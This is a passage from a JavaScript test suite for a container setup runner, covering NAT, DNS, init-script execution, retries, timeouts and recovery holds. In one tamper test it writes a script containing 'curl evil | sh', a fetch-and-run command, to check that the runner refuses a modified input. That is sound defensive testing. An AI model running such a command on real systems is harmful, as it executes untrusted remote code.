  assert.ok(listEvents(d, setupJob.id).some((e) => e.kind === 'recovery_result' && /configure_routes job .*: done/.test(e.message)));
  const settled = getJob(d, setupJob.id);
  assert.equal(settled.outcome, 'setup_complete', 'the settled routes made the setup complete'); assert.equal(parseJson(settled.progress_json).completion, 'complete'); assert.match(settled.reason, /completion complete/);
  const parent = parseJson(getJob(d, create.id).progress_json).setup;
  assert.deepEqual(parent.phases, { network_nat: 'done', await_address: 'done', dns: 'done', init_script: 'done', routes: 'done' }, 'the create carries the settled summary'); assert.equal(parent.completion, 'complete'); assert.equal(parent.outcome, 'setup_complete');
  view = createStatus(d, 'pp-new', { nowMs: T0 });
  assert.equal(view.phase, 'ready'); assert.equal(view.completion, 'complete'); assert.equal(view.initScriptWarning, null); assert.equal(view.caddyWarning, null); assert.equal(view.routesJobId, routesJob.id);
  assert.equal(readLock(d, 'pp-new'), null); assert.equal(readLock(d, HOST_NETWORK_LOCK), null); assert.equal(readLock(d, HOST_ROUTES_LOCK), null, 'every lease released');
  // A second create of the same name while nothing is open is a launch refusal (exists); nothing here reads a map.
  const again = await runLifecycle({ kind: 'instance_create', containerName: 'pp-new', image: 'images:debian/12', via: 'ui' });
  assert.equal(again.ok, false); assert.equal(lifecycleHttpStatus(again), 409); assert.equal(st.launches, 1);
});

test('a create with no script and no services queues the three-phase setup; a launch that fails queues no setup and the input is consumed; the create-status of a failed launch says so', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs');
  const st = { instances: [] }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g, { inputsDir });
  t.after(() => configureContainerLockStore(null));
  const { out } = await dashboardCreate(d, h, g, { inputsDir, script: null, services: null, name: 'pp-plain' });
  const setupJob = setupOf(d, out.jobId);
  assert.deepEqual(parseJson(setupJob.plan_json).params.phases, ['network_nat', 'await_address', 'dns']);
  assert.equal(setupJob.status, 'succeeded'); assert.equal(phasesOf(d, setupJob.id).routes, undefined);
  assert.equal(createStatus(d, 'pp-plain', { nowMs: T0 }).phase, 'ready');
  st.launchFails = true;
  const bad = await dashboardCreate(d, h, g, { inputsDir, name: 'pp-bad' });
  const create = getJob(d, bad.out.jobId);
  assert.equal(create.status, 'failed'); assert.equal(parseJson(create.progress_json).setup_job_id, undefined, 'no setup for a guest that is not there');
  assert.equal(listJobs(d, { app: 'pp-bad' }).filter((j) => j.kind === 'guest_setup').length, 0);
  const view = createStatus(d, 'pp-bad', { nowMs: T0 });
  assert.equal(view.phase, 'failed'); assert.match(view.error, /image not found/);
  assert.ok(readInitScriptInput(inputsDir, bad.setup.initScript.ref), 'the executor never reached the input; the sweep removes it after a day');
});

// ── 5. MCP's create and the start / restart fix-up ────────────────────────

test('MCP create: the launch carries the NAT + address plan (no script, no routes); the tool waits on the setup RECORD for the host-reachable address', async (t) => {
  const d = db(); const st = { instances: [], addressAfter: 3 }; const h = scriptedHost(st); const g = scriptedGuest({});
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const launch = await runLifecycle({ kind: 'instance_create', containerName: 'pp-m', image: 'images:debian/12', profile: 'default', config: { 'limits.cpu': '2', 'limits.memory': '4096MiB', 'boot.autostart': 'true' }, setup: { phases: ['network_nat', 'await_address'], addressTimeoutMs: 15_000 }, requestedBy: 'key-1', via: 'mcp' });
  assert.equal(launch.ok, true, JSON.stringify(launch)); assert.ok(launch.setupJobId, 'the create answers with the setup job');
  const setup = await waitForSetup(d, launch.setupJobId, { timeoutMs: 5000 });
  assert.equal(setup.status, 'succeeded'); assert.equal(setup.progress.address.ip, '10.10.10.7'); assert.deepEqual(Object.keys(setup.progress.phases), ['network_nat', 'await_address']);
  assert.equal(g.calls.length, 0, 'no guest script for an MCP create'); assert.equal(setup.via, 'system'); assert.equal(setup.requested_by, 'key-1');
});

test('start / restart / reboot with fixup: the NAT + DNS setup is a follow-up of the job, bound to the guest, recorded — a start of an already-Running guest still gets it; a managed restart queues the setup and then the ladder', async (t) => {
  const d = db(); const st = { instances: [inst({ status: 'Stopped' })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  opsStore(d, h, g);
  t.after(() => configureContainerLockStore(null));
  const start = await runLifecycle({ kind: 'instance_start', containerName: 'pp-x', fixup: true, via: 'ui', requestedBy: 'thomas' });
  assert.equal(start.ok, true, JSON.stringify(start)); assert.equal(start.instanceState, 'Running'); assert.ok(start.setupJobId);
  const s1 = getJob(d, start.setupJobId);
  assert.equal(s1.status, 'succeeded'); assert.deepEqual(parseJson(s1.plan_json).params.phases, ['network_nat', 'dns']); assert.deepEqual(parseJson(s1.plan_json).params.expect, { uuid: UUID_A, created_at: '2026-09-01T10:00:00Z' });
  assert.equal(gs.dnsWrites, 1); assert.equal(parseJson(getJob(d, start.jobId).progress_json).setup.status, 'succeeded');
  const again = await runLifecycle({ kind: 'instance_start', containerName: 'pp-x', fixup: true, via: 'ui' });
  assert.equal(again.alreadyInState, true); assert.ok(again.setupJobId, 'nothing issued for the start, the fix-up still queued'); assert.equal(getJob(d, again.setupJobId).status, 'succeeded'); assert.equal(gs.dnsWrites, 2);
  const plain = await runLifecycle({ kind: 'instance_restart', containerName: 'pp-x', force: false, via: 'ui' });
  assert.equal(plain.ok, true); assert.equal(plain.setupJobId, null, 'no fixup asked, no setup');
  // Managed: the setup runs first, then the ladder (a second follow-up).
  configureContainerLockStore(null);
  const { asked } = opsStore(d, h, g);
  const managedStore = configureContainerLockStore;
  void managedStore; void asked;
  const res = await runLifecycle({ kind: 'instance_restart', containerName: 'pp-x', force: true, fixup: true, via: 'ui' });
  assert.equal(res.ok, true); assert.ok(res.setupJobId);
  const follow = listJobs(d, { app: 'pp-x' }).filter((j) => ['guest_setup', 'verify_app'].includes(j.kind) && (parseJson(j.plan_json).params.origin?.jobId === res.jobId)).sort((a, b) => a.created_at.localeCompare(b.created_at) || a.id.localeCompare(b.id));
  assert.deepEqual(follow.map((j) => j.kind), ['guest_setup'], 'pp-x is not a project: the ladder does not apply');
});

// ── 6. failures after the guest is Running: partial, truthful, guest kept ─

test('no address: the wait ends at its bound, DNS and the init script still run, the routes are skipped and say why; the job is setup_partial; the guest is Running and never deleted; create-status is ready with the warning', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })], noAddress: true }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: [...SETUP_PHASES], expect: { uuid: UUID_B }, initScript: script, services: SERVICES, serviceName: 'n', addressTimeoutMs: 30_000 }, nowMs: T0 });
  assert.ok(sub.job, sub.error);
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'setup_partial');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.await_address.state, 'failed'); assert.match(ph.await_address.detail, /no host-reachable IPv4 address within 30 s/); assert.ok(ph.await_address.polls >= 30, `polled ${ph.await_address.polls} times over a fake clock`);
  assert.equal(ph.dns.state, 'done'); assert.equal(ph.init_script.state, 'done'); assert.equal(ph.routes.state, 'skipped'); assert.match(ph.routes.detail, /no host-reachable address/);
  assert.equal(listJobs(d, { app: 'pp-n' }).filter((j) => j.kind === 'configure_routes').length, 0);
  assert.equal(st.deletes, undefined); assert.equal(st.instances[0].status, 'Running');
  assert.match(getJob(d, sub.job.id).reason, /await_address failed/);
  assert.equal(parseJson(getJob(d, sub.job.id).verification_json).state, 'not_applicable');
  assert.equal(readLock(d, 'pp-n'), null);
});

test('an init script that exits nonzero: recorded with its code and the log\'s reference (never its output), the input consumed, the guest kept; a RETRY redoes NAT and DNS, never runs the script again, and KEEPS the failure — it is still a failed setup', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { initRc: 100 }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'await_address', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed'); assert.equal(out.ran[0].outcome, 'setup_partial');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'failed'); assert.equal(ph.init_script.rc, 100); assert.equal(ph.init_script.log, `/var/log/pp-init-${sub.job.id}.log`); assert.equal(ph.init_script.logBytes, 61); assert.equal(ph.init_script.tail, undefined, 'no output on the record');
  assert.equal(readInitScriptInput(inputsDir, script.ref), null, 'consumed');
  assert.match(initWarning(ph.init_script), /exited with code 100; its output \(61 bytes\) is in \/var\/log\/pp-init-/);
  assert.equal(parseJson(getJob(d, sub.job.id).progress_json).completion, 'partial'); assert.equal(readLock(d, 'pp-n'), null, 'a failed init holds nothing: its writer ended');
  noScriptIn(d, [sub.job.id]);
  assert.equal(gs.initScripts.length, 1);
  // The retry: the same plan with retryOf (what POST /api/setup/jobs/:id/retry queues).
  gs.initRc = 0;
  const retry = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: parseJson(getJob(d, sub.job.id).plan_json), configRefs: {}, retryOf: sub.job.id, via: 'ui', nowMs: T0 + 60_000 });
  c.tick(60_000);
  const out2 = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out2.ran[0].id, retry.id); assert.equal(out2.ran[0].status, 'failed', 'a retry that cannot repeat a failed init is still a failed setup'); assert.equal(out2.ran[0].outcome, 'setup_partial');
  const ph2 = phasesOf(d, retry.id);
  assert.equal(ph2.network_nat.state, 'done'); assert.equal(ph2.dns.state, 'done');
  assert.equal(ph2.init_script.state, 'failed', 'the original result is kept'); assert.equal(ph2.init_script.rc, 100); assert.equal(ph2.init_script.notRepeated, true); assert.equal(ph2.init_script.log, `/var/log/pp-init-${sub.job.id}.log`); assert.match(ph2.init_script.detail, /exited 100 in the attempt this job retries; .* a retry never repeats an issued init script/);
  assert.equal(parseJson(getJob(d, retry.id).progress_json).completion, 'partial'); assert.match(initWarning(ph2.init_script), /not run again/);
  assert.equal(gs.initScripts.length, 1, 'the script did not run again'); assert.equal(gs.dnsWrites, 2);
  noScriptIn(d, [retry.id]);
});

test('an init script that times out: the exec client dies at the bound; the kill script establishes the writer stopped → timed_out with the log named and no hold; a writer still alive after the kill → uncertain and the guest is HELD', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { initTimesOut: true }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script, initTimeoutMs: 60_000 }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.init_script.state, 'timed_out'); assert.equal(ph.init_script.killed, 'gone'); assert.deepEqual(ph.init_script.writer, { state: 'stopped', pid: null }); assert.match(ph.init_script.detail, /ran longer than 60 s and was stopped — its containment group \(1 recorded\) is empty \(its output is in \/var\/log\/pp-init-/); assert.equal(ph.init_script.tail, undefined); assert.equal(ph.init_script.groups, 1);
  assert.equal(g.calls.find((x) => x.phase === 'init_kill').contained, false, 'the kill is issued outside the containment wrapper'); assert.equal(g.calls.find((x) => x.phase === 'init').contained, true);
  assert.equal(gs.killed, 1); assert.equal(gs.initScripts.length, 1);
  assert.equal(readInitScriptInput(inputsDir, script.ref), null);
  assert.match(initWarning(ph.init_script), /timed out after 1 minute\(s\)/);
  assert.equal(readLock(d, 'pp-n'), null, 'the writer was established stopped: no hold');
  // The kill cannot establish the writer stopped: unknown completion, held.
  const gs2 = { initTimesOut: true, killResult: 'alive' }; const g2 = scriptedGuest(gs2);
  const script2 = writeInitScriptInput(inputsDir, SCRIPT);
  const sub2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script2, initTimeoutMs: 60_000 }, nowMs: T0 });
  const out2 = await runAll(d, exec(h, g2), c, { inputsDir });
  if (gs2.hookError) throw gs2.hookError;
  assert.equal(out2.ran[0].status, 'recovery_required'); assert.equal(out2.ran[0].outcome, 'init_uncertain');
  const ph2 = phasesOf(d, sub2.job.id);
  assert.equal(ph2.init_script.state, 'uncertain'); assert.equal(ph2.init_script.writer.state, 'running'); assert.match(ph2.init_script.detail, /still alive after the kill/);
  holdOn(d, 'pp-n', sub2.job.id);
  assert.equal(submitRunnerJob(d, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: T0 }).code, 'CONTAINER_BUSY', 'the lease is still live (held by the job) then stale: refused either way');
  // No containment record to inspect: the same hold, whatever became of the recorded pid.
  const d3 = db(); const gs3 = { initTimesOut: true, killResult: 'norecord' }; const g3 = scriptedGuest(gs3);
  const script3 = writeInitScriptInput(inputsDir, SCRIPT);
  const sub3 = submitRunnerJob(d3, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script3, initTimeoutMs: 60_000 }, nowMs: T0 });
  const out3 = await runAll(d3, exec(h, g3), c, { inputsDir });
  assert.equal(out3.ran[0].outcome, 'init_uncertain');
  const ph3 = phasesOf(d3, sub3.job.id);
  assert.equal(ph3.init_script.killed, 'norecord'); assert.equal(ph3.init_script.groups, 0); assert.equal(ph3.init_script.writer.state, 'unknown'); assert.match(ph3.init_script.detail, /containment record is missing/);
  holdOn(d3, 'pp-n', sub3.job.id);
  // An inspection that could not conclude, likewise.
  const d4 = db(); const g4 = scriptedGuest({ initTimesOut: true, killResult: 'unknown 0' });
  const sub4 = submitRunnerJob(d4, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: writeInitScriptInput(inputsDir, SCRIPT), initTimeoutMs: 60_000 }, nowMs: T0 });
  await runAll(d4, exec(h, g4), c, { inputsDir });
  assert.equal(phasesOf(d4, sub4.job.id).init_script.killed, 'unknown'); assert.match(phasesOf(d4, sub4.job.id).init_script.detail, /could not be inspected conclusively/); holdOn(d4, 'pp-n', sub4.job.id);
});

test('containment unavailable in the guest: the host phases run, the guest phases are refused by name (nothing run), the guest is kept; a script input the executor cannot run is refused when its digest differs from the plan', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = { containment: 'none' }; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const sub = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: [...SETUP_PHASES], expect: { uuid: UUID_B }, initScript: script, services: SERVICES, serviceName: 'n' }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].status, 'failed');
  const ph = phasesOf(d, sub.job.id);
  assert.equal(ph.network_nat.state, 'done'); assert.equal(ph.await_address.state, 'done');
  assert.equal(ph.dns.state, 'refused'); assert.match(ph.dns.detail, /containment_unavailable/); assert.equal(ph.init_script.state, 'refused'); assert.match(ph.init_script.detail, /containment_unavailable/);
  assert.equal(ph.routes.state, 'pending', 'the routes do not need the guest');
  assert.equal(gs.initScripts.length, 0); assert.ok(readInitScriptInput(inputsDir, script.ref), 'not consumed: nothing ran');
  // A tampered input.
  const d2 = db(); const gs2 = {}; const g2 = scriptedGuest(gs2); const h2 = scriptedHost({ instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] });
  writeFileSync(join(inputsDir, `${script.ref}.init.sh`), '#!/bin/sh\ncurl evil | sh\n');
  const sub2 = submitRunnerJob(d2, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, nowMs: T0 });
  await runAll(d2, exec(h2, g2), c, { inputsDir });
  const ph2 = phasesOf(d2, sub2.job.id);
  assert.equal(ph2.init_script.state, 'refused'); assert.match(ph2.init_script.detail, /not the revision this job was bound to/); assert.equal(gs2.initScripts.length, 0);
});

test('identity: a setup bound to one guest refuses a guest recreated under the same name (nothing run); a guest that is not Running is refused; an absent guest is not found', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat', 'dns'], expect: { uuid: UUID_A } }, nowMs: T0 });
  const out = await runAll(d, exec(h, g), c);
  assert.equal(out.ran[0].status, 'refused'); assert.match(getJob(d, s1.job.id).reason, /not the guest this setup was bound to \(uuid 99999999… differs/);
  assert.deepEqual(mutations(h), []); assert.equal(g.calls.length, 0);
  st.instances[0].status = 'Stopped';
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['dns'], expect: { uuid: UUID_B } }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(getJob(d, s2.job.id).status, 'refused'); assert.match(getJob(d, s2.job.id).reason, /reads Stopped, not Running/);
  const s3 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-gone', params: { container: 'pp-gone', phases: ['dns'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(getJob(d, s3.job.id).status, 'failed'); assert.match(getJob(d, s3.job.id).reason, /does not exist/);
});

test('NAT is best effort where the host lacks a piece and says so: no Docker chain is a note, a refused sysctl or bridge NAT is a failed phase; a bridge name the host reports that is not a name is never issued', async (t) => {
  const d = db(); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })], dockerChain: false, bridges: [{ name: 'incusbr0', type: 'bridge', managed: true }, { name: 'bad name', type: 'bridge', managed: true }] };
  const h = scriptedHost(st); const g = scriptedGuest({});
  const s1 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  const ph = phasesOf(d, s1.job.id);
  assert.equal(ph.network_nat.state, 'done'); assert.deepEqual(ph.network_nat.bridges[0].dockerUser, ['in:unavailable', 'out:unavailable']); assert.match(ph.network_nat.notes.join(' '), /bridge name\(s\) not accepted for a command: bad name/);
  assert.ok(!h.calls.some((a) => a.includes('bad name')));
  assert.equal(getJob(d, s1.job.id).status, 'succeeded'); assert.match(getJob(d, s1.job.id).reason, /NAT: /);
  st.sysctlFails = true;
  const s2 = submitRunnerJob(d, { kind: 'guest_setup', app: 'pp-n', params: { container: 'pp-n', phases: ['network_nat'] }, nowMs: T0 });
  await runAll(d, exec(h, g), c);
  assert.equal(phasesOf(d, s2.job.id).network_nat.state, 'failed'); assert.match(phasesOf(d, s2.job.id).network_nat.detail, /ip_forward/); assert.equal(getJob(d, s2.job.id).status, 'failed');
});

// ── 7. interruption ───────────────────────────────────────────────────────

function deadSetup(d, { params, cp, id = 'dead-1', owner = DEAD, progress = null }) {
  createJob(d, { id, kind: 'guest_setup', app: params.container, plan: { steps: [], params }, nowMs: T0 - 100_000 });
  const c = claimNextJob(d, { owner, kinds: ['guest_setup'], nowMs: T0 - 99_000 });
  checkpoint(d, { id, owner, epoch: c.epoch, phase: cp.phase, checkpoint: cp, progress, nowMs: T0 - 98_000 });
  acquireLock(d, { app: params.container, owner, operation: 'guest_setup', jobId: id, nowMs: T0 - 98_000 });
  return getJob(d, id);
}

test('interruption BEFORE the script was issued: the dead owner\'s setup is resumed by the runner\'s reconcile, the idempotent phases run again, the script runs exactly once', async (t) => {
  const d = db(); const inputsDir = join(tmp(), 'setup-inputs'); const c = clock();
  const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const gs = {}; const g = scriptedGuest(gs);
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const params = { container: 'pp-n', phases: ['network_nat', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script };
  deadSetup(d, { params, cp: { phase: 'dns', setup: true, resumable: true, disruptive: false, target: { uuid: UUID_B, created_at: '2026-09-01T10:00:00Z' }, container: 'pp-n', phases: { network_nat: { state: 'done' } } } });
  const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: true });
  assert.equal(dec.action, 'resume');
  const r = reconcile({ db: d, owner: RUNNER, nowMs: T0 });
  assert.deepEqual(r.requeued, ['dead-1']); assert.equal(readLock(d, 'pp-n'), null);
  const out = await runAll(d, exec(h, g), c, { inputsDir });
  assert.equal(out.ran[0].id, 'dead-1'); assert.equal(out.ran[0].status, 'succeeded', getJob(d, 'dead-1').reason);
  assert.equal(gs.initScripts.length, 1); assert.equal(phasesOf(d, 'dead-1').init_script.state, 'done'); assert.equal(getJob(d, 'dead-1').owner, RUNNER);
});

test('interruption AFTER the script was issued: the resumed job READS the exit code the guest recorded and never runs the script again; with nothing recorded it ends recovery_required / init_uncertain with the lease released and the origin annotated; the boot sweep records the same for a dead backend', async (t) => {
  const inputsDir = join(tmp(), 'setup-inputs');
  const script = writeInitScriptInput(inputsDir, SCRIPT);
  const cp = { phase: 'init_script', setup: true, resumable: true, disruptive: false, init_issued: true, target: { uuid: UUID_B, created_at: '2026-09-01T10:00:00Z' }, container: 'pp-n', phases: { network_nat: { state: 'done' }, dns: { state: 'done' } }, script: { ref: script.ref, sha256: script.sha256 } };
  const mk = (gs) => { const d = db(); const st = { instances: [inst({ name: 'pp-n', config: { 'volatile.uuid': UUID_B } })] }; const h = scriptedHost(st); const g = scriptedGuest(gs); return { d, h, g, st }; };
  // (a) the guest recorded exit 0.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: 0 });
    const params = { container: 'pp-n', phases: ['network_nat', 'dns', 'init_script'], expect: { uuid: UUID_B }, initScript: script };
    deadSetup(d, { params, cp });
    const dec = reconcileDecision({ job: getJob(d, 'dead-1'), lock: readLock(d, 'pp-n'), nowMs: T0, canAct: true });
    assert.equal(dec.action, 'resume'); assert.match(dec.reason, /never runs the script again/);
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    const out = await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(out.ran[0].status, 'succeeded', getJob(d, 'dead-1').reason);
    const ph = phasesOf(d, 'dead-1');
    assert.equal(ph.init_script.state, 'done'); assert.equal(ph.init_script.resumed, true); assert.match(ph.init_script.detail, /exit code read from the guest/);
    assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0, 'the script was NOT run again'); assert.equal(g.calls.filter((x) => x.phase === 'init_read').length, 1);
  }
  // (b) the guest recorded exit 7.
  {
    const c = clock(); const { d, h, g } = mk({ guestRc: 7 });
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script }, cp });
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(getJob(d, 'dead-1').status, 'failed'); assert.equal(phasesOf(d, 'dead-1').init_script.rc, 7); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
  }
  // (c) nothing recorded and the writer still running: uncertain, the guest HELD,
  //     the origin annotated; every conflicting kind refused or waiting; only an
  //     acknowledgement that establishes the writer stopped releases it — atomically.
  {
    const c = clock(); const { d, h, g, st } = mk({ guestRc: null, guestRunning: 4242 });
    createJob(d, { id: 'create-1', kind: 'instance_create', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', image: 'images:debian/12' } }, status: 'succeeded', nowMs: T0 - 200_000 });
    deadSetup(d, { params: { container: 'pp-n', phases: ['init_script'], expect: { uuid: UUID_B }, initScript: script, origin: { jobId: 'create-1', kind: 'instance_create' } }, cp });
    reconcile({ db: d, owner: RUNNER, nowMs: T0 });
    const out = await runAll(d, exec(h, g), c, { inputsDir });
    assert.equal(out.ran[0].status, 'recovery_required'); assert.equal(out.ran[0].outcome, 'init_uncertain');
    const ph = phasesOf(d, 'dead-1');
    assert.equal(ph.init_script.state, 'uncertain'); assert.deepEqual(ph.init_script.writer, { state: 'running', pid: 4242 }); assert.match(ph.init_script.detail, /still running in the guest as pid 4242/); assert.equal(ph.init_script.tail, undefined);
    assert.match(getJob(d, 'dead-1').reason, /pp-init-dead-1\.rc/); assert.equal(g.calls.filter((x) => x.phase === 'init').length, 0);
    assert.equal(parseJson(getJob(d, 'dead-1').progress_json).completion, 'uncertain');
    assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.outcome, 'init_uncertain'); assert.equal(parseJson(getJob(d, 'create-1').progress_json).setup.completion, 'uncertain');
    assert.ok(listEvents(d, 'dead-1').some((e) => e.kind === 'hold'));
    const held = holdOn(d, 'pp-n', 'dead-1');
    assert.equal(held.owner, RUNNER, 'the job\'s own lease is kept and flagged');
    c.tick(60_000); // the kept lease lapses: a recorded stale condition, never a free lock
    // Every conflicting kind: refused at submission and at the executor, nothing issued.
    for (const kind of ['instance_delete', 'instance_stop', 'instance_start', 'instance_restart', 'restore_snapshot', 'guest_setup']) {
      const params = kind === 'restore_snapshot' ? { container: 'pp-n', snapshot: 'snap-1' } : kind === 'guest_setup' ? { container: 'pp-n', phases: ['dns'] } : { container: 'pp-n' };
      const sub = submitRunnerJob(d, { kind, app: 'pp-n', params, nowMs: c.nowMs() });
      assert.equal(sub.code, 'CONTAINER_LOCK_STALE', `${kind} at submission: ${sub.error}`); assert.match(sub.error, /recovery is required/);
    }
    const before = h.calls.length; const guestBefore = g.calls.length;
    const rawDelete = createJob(d, { kind: 'instance_delete', app: 'pp-n', plan: { steps: [], params: { container: 'pp-n', force: true } }, nowMs: c.nowMs() });
    const rawRetry = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: parseJson(getJob(d, 'dead-1').plan_json), retryOf: 'dead-1', nowMs: c.nowMs() }); // carries the origin: a follow-up's retry waits
    const { origin: _o, ...directParams } = parseJson(getJob(d, 'dead-1').plan_json).params;
    const rawDirect = createJob(d, { kind: 'guest_setup', app: 'pp-n', plan: { steps: [], params: directParams }, retryOf: 'dead-1', nowMs: c.nowMs() }); // an operator's direct retry is refused
    const follow = createJob(d, { kind: 'verify_app', app: 'pp-n', plan: { steps: ['probe_port'], params: { container: 'pp-n', webPort: 3000, origin: { jobId: 'create-1', kind: 'instance_create', rung: 'x' } } }, nowMs: c.nowMs() });
    const probe = createJob(d, { kind: 'probe', app: 'pp-n', plan: { steps: ['probe_port'], params: { container: 'pp-n', webPort: 3000 } }, nowMs: c.nowMs() });
    await runAll(d, exec(h, g), c);
    assert.equal(getJob(d, rawDelete.id).status, 'refused'); assert.equal(getJob(d, rawDelete.id).outcome, 'lock_stale');
    assert.equal(getJob(d, rawRetry.id).status, 'queued', 'a retry that is itself a follow-up waits on the hold'); assert.ok(listEvents(d, rawRetry.id).some((e) => e.kind === 'hold'));
    assert.equal(getJob(d, rawDirect.id).status, 'refused'); assert.equal(getJob(d, rawDirect.id).outcome, 'lock_stale');
    assert.equal(getJob(d, follow.id).status, 'queued', 'a follow-up waits'); assert.ok(listEvents(d, follow.id).some((e) => e.kind === 'hold' && /init script of pp-n has an unknown outcome/.test(e.message)));
    assert.equal(getJob(d, probe.id).status, 'deferred', 'a probe defers'); assert.equal(getJob(d, probe.id).outcome, 'lock_held');
    assert.equal(h.calls.length, before, 'no incus stop / delete was issued'); assert.equal(g.calls.length, guestBefore, 'no guest script ran'); assert.equal(st.instances.length, 1); assert.equal(st.instances[0].status, 'Running');
    holdOn(d, 'pp-n', 'dead-1');
    // The acknowledgement must establish the writer stopped.
    const noAttest = acknowledgeUncertainJob(d, { id: 'dead-1', by: 'thomas', nowMs: c.nowMs() });
    assert.equal(noAttest.ok, false); assert.equal(noAttest.code, 'WRITER_NOT_ESTABLISHED'); holdOn(d, 'pp-n', 'dead-1'); assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain');
    // ... and is one transaction: a failing event write records nothing and releases nothing.
    const realPrepare = d.prepare.bind(d);
    d.prepare = (sql) => { if (/INSERT INTO setup_job_events/.test(sql)) { const st2 = realPrepare(sql); return { run: (...a) => { if (a.some((v) => /acknowledged by/.test(String(v)))) throw new Error('disk full'); return st2.run(...a); } }; } return realPrepare(sql); };
    const broken = acknowledgeUncertainJob(d, { id: 'dead-1', by: 'thomas', writerStopped: true, nowMs: c.nowMs() });
    d.prepare = realPrepare;
    assert.equal(broken.ok, false); assert.equal(broken.code, 'NOT_RECORDED'); holdOn(d, 'pp-n', 'dead-1'); assert.equal(getJob(d, 'dead-1').outcome, 'init_uncertain'); assert.equal(phasesOf(d, 'dead-1').init_script.acknowledged, undefined);
    assert.equal(submitRunnerJob(d, { kind: 'instance_stop', app: 'pp-n', params: { container: 'pp-n' }, nowMs: c.nowMs() }).code, 'CONTAINER_LOCK_STALE', 'still refused');
    // A sound acknowledgement with the attestation: outcome, phase, event and release together.
